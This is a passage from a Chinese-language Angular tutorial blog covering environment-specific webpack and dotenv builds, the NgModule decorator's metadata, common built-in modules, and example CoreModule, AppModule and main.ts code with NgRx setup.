<span class="token string">&quot;build:intranet&quot;</span><span class="token operator">:</span> <span class="token string">&quot;cross-env NODE_ENV=intranet npm run build -- --configuration=intranet&quot;</span><span class="token punctuation">,</span>
<span class="token string">&quot;build:production&quot;</span><span class="token operator">:</span> <span class="token string">&quot;cross-env NODE_ENV=production npm run build -- --build--optimizer --configuration=production&quot;</span><span class="token punctuation">,</span>
<span class="token comment">// webpack.config.js</span>
<span class="token keyword">const</span> Dotenv <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'dotenv-webpack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> merge <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'webpack-merge'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> env <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span><span class="token punctuation">;</span> <span class="token comment">// 👈 拿到node运行时变量</span>
<span class="token keyword">const</span> CompressionWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'compression-webpack-plugin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> productionGzipExtensions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'js'</span><span class="token punctuation">,</span> <span class="token string">'css'</span><span class="token punctuation">,</span> <span class="token string">'txt'</span><span class="token punctuation">,</span><span class="token string">'svg'</span><span class="token punctuation">,</span><span class="token string">'eot'</span><span class="token punctuation">,</span><span class="token string">'woff'</span><span class="token punctuation">,</span><span class="token string">'ttf'</span><span class="token punctuation">,</span><span class="token string">'svg'</span><span class="token punctuation">,</span><span class="token string">'ico'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> config <span class="token operator">=</span> <span class="token punctuation">{</span>
  devServer<span class="token operator">:</span> <span class="token punctuation">{</span>
    disableHostCheck<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  module<span class="token operator">:</span> <span class="token punctuation">{</span>
    rules<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> <span class="token punctuation">{</span>
  plugins<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token keyword">new</span> <span class="token class-name">Dotenv</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      path<span class="token operator">:</span> env <span class="token operator">===</span> <span class="token string">'production'</span> <span class="token operator">?</span> <span class="token string">'.env.production'</span> <span class="token operator">:</span>
        env <span class="token operator">===</span> <span class="token string">'intranet'</span> <span class="token operator">?</span> <span class="token string">'.env.intranet'</span> <span class="token operator">:</span>
          env <span class="token operator">===</span> <span class="token string">'test'</span> <span class="token operator">?</span> <span class="token string">'.env.test'</span> <span class="token operator">:</span> <span class="token string">'.env.development'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 👈 根据不同运行时变量引入不同的文件</span>
    <span class="token comment">// new CompressionWebpackPlugin({</span>
      <span class="token comment">// algorithm: 'gzip',</span>
      <span class="token comment">// test: new RegExp('\\.(' + productionGzipExtensions.join('|') + ')$'),</span>
      <span class="token comment">// threshold: 10240, // 只有大小大于该值的资源会被处理 10240</span>
      <span class="token comment">// minRatio: 0.8 // 只有压缩率小于这个值的资源才会被处理</span>
      <span class="token comment">// deleteOriginalAssets: false // 删除原文件</span>
    <span class="token comment">// })</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p><img src="/vuebloger/img/post/Snipaste_2021-04-12_17-32-30.png" alt=""></p> <p>这样，假设.env定义</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>environment<span class="token operator">=</span>test
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>在组件中就可以使用process.env.environment访问到’test‘。</p> <h2 id="ngmodule"><a href="#ngmodule" class="header-anchor">#</a> ngModule</h2> <p>一个模块内部可以包含组件、指令、管道，并且可以将它们的访问权限声明为公有，以使外部模块的组件可以访问和使用到它们。</p> <p><img src="/vuebloger/img/post/20190608184127910.png" alt=""></p> <p>@NgModule 是一个装饰器函数，它有一个元数据（metadata）对象。这个对象的属性（properties）用于修饰这个模块。主要属性有以下这5个：</p> <ol><li>declarations: 从属于这个模块的视图类（ view classes）。Angular 有3种视图类：组件（components）, 指令（directives） 以及管道（pipes）</li> <li>exports: declarations 的子集，在其他模块的组件模板中可见以及可用的视图类（即暴露给其他模块用的视图类）。</li> <li>imports: 在这个模块的组件模板中需要使用到的类所在的其它模块（即依赖的其他模块）。也可以导入一些通过npm install 安装的一些模块。</li> <li>providers: 服务（service）的创建者，这个模块将这些服务添加到整个全局服务集合中。这些服务在整个应用中可用。</li> <li>bootstrap: 应用的主视图，称作根组件（root component）， 存储着应用其他的视图。只有根模块（root module）需要设置这个属性。</li> <li>entryComponents：动态组件要声明在这里。</li></ol> <p>接口定义：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> declare <span class="token keyword">interface</span> <span class="token class-name">NgModule</span> <span class="token punctuation">{</span>
    providers<span class="token operator">?</span><span class="token operator">:</span> Provider<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    declarations<span class="token operator">?</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span>Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token operator">|</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
    imports<span class="token operator">?</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span>Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token operator">|</span> ModuleWithProviders<span class="token operator">&lt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">&gt;</span> <span class="token operator">|</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
    exports<span class="token operator">?</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span>Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token operator">|</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
    entryComponents<span class="token operator">?</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span>Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token operator">|</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
    bootstrap<span class="token operator">?</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span>Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token operator">|</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
    schemas<span class="token operator">?</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span>SchemaMetadata <span class="token operator">|</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="常用内置module"><a href="#常用内置module" class="header-anchor">#</a> 常用内置Module</h3> <ul><li>BrowserModule，导出于@angular/platform-browser，提供在浏览中运行的一些资源</li> <li>platformBrowserDynamic，导出于@angular/platform-browser-dynamic，从一个指定的NgModule中使用根组件引导应用（main.ts）</li> <li>CommonModule，导出于@angular/common，提供*ngIf，*ngFor等</li> <li>FormsModule，导出于@angular/forms，提供模板表单相关</li> <li>ReactiveFormsModule，导出于@angular/forms，提供响应表单相关</li> <li>BrowserAnimationsModule，导出于@angular/platform-browser/animations，提供动画相关</li> <li>HttpClientModule，导出于@angular/common/http，提供请求服务相关</li> <li>RouterModule，导出于@angular/router，要使用路由功能，要用到 RouterLink,.forRoot() 和 .forChild()</li></ul> <h3 id="模块中的资源"><a href="#模块中的资源" class="header-anchor">#</a> 模块中的资源</h3> <p>一个模块涵盖很多资源如指令，常量，管道，服务等，如@angular/forms：</p> <ol><li>类
<ul><li>AbstractControl</li> <li>AbstractControlDirective</li> <li>AbstractFormGroupDirective</li> <li>ControlContainer</li> <li>FormBuilder</li> <li>FormArray</li> <li>FormControl</li> <li>FormGroup</li> <li>FormsModule</li> <li>NgControl</li> <li>ReactiveFromsModule</li> <li>Validators</li></ul></li> <li>指令
<ul><li>CheckboxControlValueAccessor</li> <li>DefaultValueAccessor</li> <li>RadioControlValueAccessor</li> <li>SelectControlValueAccessor</li> <li>SelectMultipleControlValueAccessor</li> <li>FormArrayName</li> <li>FormControlName</li> <li>FormGroupName</li> <li>FormControlDirective</li> <li>FormGroupDirective</li> <li>MaxLengthValidator</li> <li>MinLengthValidator</li> <li>PatternValidator</li> <li>RequiredValidator</li> <li>NgForm</li> <li>NgModel</li> <li>NgModelGroup</li> <li>NgSelectOption</li></ul></li> <li>接口
<ul><li>AsyncValidatorFn</li> <li>ControlValueAccessor</li> <li>Form</li> <li>Validator</li> <li>ValidatorFn</li></ul></li> <li>常量
<ul><li>NG_ASYNC_VALIDATORS</li> <li>NG_VALIDATORS</li> <li>NG_VALUE_ACCESSOR</li></ul></li></ol> <p>各个模块包含哪些资源请查看<a href="https://angular.io/api" target="_blank" rel="noopener noreferrer">angular API List<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h3 id="coremodule"><a href="#coremodule" class="header-anchor">#</a> coreModule</h3> <p>一般项目中会使用core模块做中做中间承载过度以灵活配置组织各个模块</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// core.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NoFoundComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'layout/404/404.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>SharedModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/shared/shared.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ServicesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/service/service.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgrxDataModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/ngrx-data/ngrx-data.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>StoreDevtoolsModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@ngrx/store-devtools'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>StoreModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@ngrx/store'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgModule<span class="token punctuation">,</span> SkipSelf<span class="token punctuation">,</span> Optional<span class="token punctuation">,</span> <span class="token constant">APP_INITIALIZER</span><span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BrowserModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BrowserAnimationsModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser/animations'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span><span class="token constant">APP_BASE_HREF</span><span class="token punctuation">,</span> registerLocaleData<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> zh <span class="token keyword">from</span> <span class="token string">'@angular/common/locales/zh'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span><span class="token constant">NZ_I18N</span><span class="token punctuation">,</span> zh_CN<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ng-zorro-antd'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HashLocationStrategy<span class="token punctuation">,</span> LocationStrategy<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpClientModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>RouteReuseStrategy<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/router'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>AtrReuseStrategy<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/routereuse/atr-reuse-strategy'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>RoutesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../routes/routes.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>environment<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../../environments/environment'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> StartupService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/services/startup.service'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">StartupServiceFactory</span><span class="token punctuation">(</span><span class="token parameter">startupService<span class="token operator">:</span> StartupService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> startupService<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> <span class="token constant">APPINIT_PROVIDES</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    provide<span class="token operator">:</span> <span class="token constant">APP_INITIALIZER</span><span class="token punctuation">,</span>
    useFactory<span class="token operator">:</span> StartupServiceFactory<span class="token punctuation">,</span>
    deps<span class="token operator">:</span> <span class="token punctuation">[</span>StartupService<span class="token punctuation">]</span><span class="token punctuation">,</span>
    multi<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token function">registerLocaleData</span><span class="token punctuation">(</span>zh<span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>NoFoundComponent<span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    BrowserModule<span class="token punctuation">,</span> <span class="token comment">// 提供基础浏览器相关</span>
    BrowserAnimationsModule<span class="token punctuation">,</span> <span class="token comment">// 动画</span>
    HttpClientModule<span class="token punctuation">,</span> <span class="token comment">// http</span>
    SharedModule<span class="token punctuation">,</span> <span class="token comment">// 公共组件使用共享模块方便使用</span>
    ServicesModule<span class="token punctuation">,</span> <span class="token comment">// 用来承载全局服务进行tree share</span>

    StoreModule<span class="token punctuation">.</span><span class="token function">forRoot</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      runtimeChecks<span class="token operator">:</span> <span class="token punctuation">{</span>
        strictStateImmutability<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        strictActionImmutability<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        strictStateSerializability<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        strictActionSerializability<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    StoreDevtoolsModule<span class="token punctuation">.</span><span class="token function">instrument</span><span class="token punctuation">(</span><span class="token punctuation">{</span>maxAge<span class="token operator">:</span> <span class="token number">25</span><span class="token punctuation">,</span> logOnly<span class="token operator">:</span> environment<span class="token punctuation">.</span>production<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 开启类redux调试器</span>
    NgrxDataModule<span class="token punctuation">,</span> <span class="token comment">// ngrx-store模块</span>
    RoutesModule
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  exports<span class="token operator">:</span> <span class="token punctuation">[</span>
    SharedModule<span class="token punctuation">,</span> <span class="token comment">// 共享模块导出全局公用</span>
    RoutesModule <span class="token comment">// 最后路由防止出错</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> LocationStrategy<span class="token punctuation">,</span> useClass<span class="token operator">:</span> HashLocationStrategy<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment">// 配置路由策略</span>
    <span class="token comment">// {provide: APP_BASE_HREF, useValue: process.env.environment !== 'development' ? '/scholar/' : '/'}, // 配置地址常量</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">NZ_I18N</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> zh_CN<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment">// 配置本地语言</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> RouteReuseStrategy<span class="token punctuation">,</span> useClass<span class="token operator">:</span> AtrReuseStrategy<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment">// 路由重用策略</span>
    <span class="token operator">...</span><span class="token constant">APPINIT_PROVIDES</span> <span class="token comment">// 初始化操作</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CoreModule</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">@<span class="token function">SkipSelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> parentModule<span class="token operator">:</span> CoreModule</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 自己注入自己用来防止该模块被其他模块使用构造器注入，因为根模块初始注入该模块不会实例化该模块</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>parentModule<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// SkipSelf防止自己不停注入自己死循环实例化 Optional防止第一次未初始化好就注入ts导致报错</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'CoreModule 只能被appModule引入'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>AppComponent<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./app.component'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>CoreModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/core/core.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>LoadingBarRouterModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@ngx-loading-bar/router'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>LoadingBarModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@ngx-loading-bar/core'</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>
    AppComponent
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>
    LoadingBarModule<span class="token punctuation">,</span>
    LoadingBarRouterModule<span class="token punctuation">,</span>
    CoreModule
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br></div></div><p>注意根模块不需要导出任何东西，因为其他组件不需要导入这个根模块。</p> <p>通过引导根模块来启动一个应用程序。在 main.ts 文件中像这样引导 AppModule：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//.src/main.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> enableProdMode <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> platformBrowserDynamic <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/platform-browser-dynamic'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> AppModule <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./app/app.module'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> environment <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./environments/environment'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>environment<span class="token punctuation">.</span>production<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">enableProdMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">platformBrowserDynamic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bootstrapModule</span><span class="token punctuation">(</span>AppModule<span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="sharemodule-servicesmodule"><a href="#sharemodule-servicesmodule" class="header-anchor">#</a> shareModule/ServicesModule</h3> <p>一般我们都会使用shareModule和ServicesModule</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// service.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgModule<span class="token punctuation">,</span> InjectionToken<span class="token punctuation">,</span> <span class="token constant">PLATFORM_ID</span><span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>environment<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../../environments/environment'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span><span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BaseInterceptor<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/interceptor/base.interceptor'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>isPlatformBrowser<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">API_CONFIG</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectionToken</span><span class="token punctuation">(</span><span class="token string">'ApiConfigToken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">WINDOW</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectionToken</span><span class="token punctuation">(</span><span class="token string">'windowToken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
